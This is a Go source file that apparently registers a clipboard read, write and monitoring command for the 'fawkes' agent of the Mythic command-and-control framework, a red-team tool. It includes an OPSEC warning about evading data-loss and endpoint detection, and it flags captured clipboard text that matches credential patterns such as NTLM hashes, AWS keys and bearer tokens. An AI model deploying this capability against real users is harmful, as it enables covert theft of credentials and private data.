package agentfunctions

import (
	"fmt"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "clipboard",
		Description:         "Read, write, or continuously monitor clipboard contents (text only). Windows: native API, Linux: xclip/xsel/wl-paste, macOS: pbpaste/pbcopy.",
		HelpString:          "clipboard -action read\nclipboard -action write -data \"text\"\nclipboard -action monitor [-interval 3]\nclipboard -action dump\nclipboard -action stop",
		Version:             2,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1115"}, // Clipboard Data
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:      "Action: read (one-shot), write (set text), monitor (continuous capture), dump (view captures), stop (end monitoring)",
				DefaultValue:     "read",
				Choices:          []string{"read", "write", "monitor", "dump", "stop"},
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:             "data",
				ModalDisplayName: "Clipboard Data",
				CLIName:          "data",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Text to write to the clipboard (only used with 'write' action)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
						UIModalPosition:     1,
					},
				},
			},
			{
				Name:             "interval",
				ModalDisplayName: "Poll Interval (seconds)",
				CLIName:          "interval",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "Polling interval in seconds for monitor action (default: 3)",
				DefaultValue:     3,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
						UIModalPosition:     2,
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input != "" {
				return args.LoadArgsFromJSONString(input)
			}
			return nil
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    "OPSEC WARNING: Clipboard access reads or monitors clipboard contents. May trigger DLP (Data Loss Prevention) alerts. Clipboard monitoring hooks are detectable by security products monitoring WM_CLIPBOARDUPDATE or GetClipboardData API calls.",
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			if displayParams, err := taskData.Args.GetFinalArgs(); err == nil && displayParams != "" {
				response.DisplayParams = &displayParams
			}
			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			action, _ := processResponse.TaskData.Args.GetStringArg("action")
			switch action {
			case "read":
				if !strings.Contains(responseText, "empty") {
					charCount := len(responseText)
					createArtifact(processResponse.TaskData.Task.ID, "Data Collection",
						fmt.Sprintf("[Clipboard Read] %d chars captured", charCount))
				}
			case "dump":
				if strings.Contains(responseText, "Captures:") {
					createArtifact(processResponse.TaskData.Task.ID, "Data Collection",
						"[Clipboard Dump] Monitor captures retrieved")
				}
				// Track detected credential patterns
				for _, tag := range []string{"NTLM Hash", "NT Hash", "Password-like", "API Key", "AWS Key", "Private Key", "Bearer Token"} {
					if strings.Contains(responseText, tag) {
						createArtifact(processResponse.TaskData.Task.ID, "Data Collection",
							fmt.Sprintf("[Clipboard] Credential pattern detected: %s", tag))
					}
				}
			case "monitor":
				createArtifact(processResponse.TaskData.Task.ID, "Data Collection",
					"[Clipboard Monitor] Continuous clipboard monitoring started")
			}
			return response
		},
	})
}
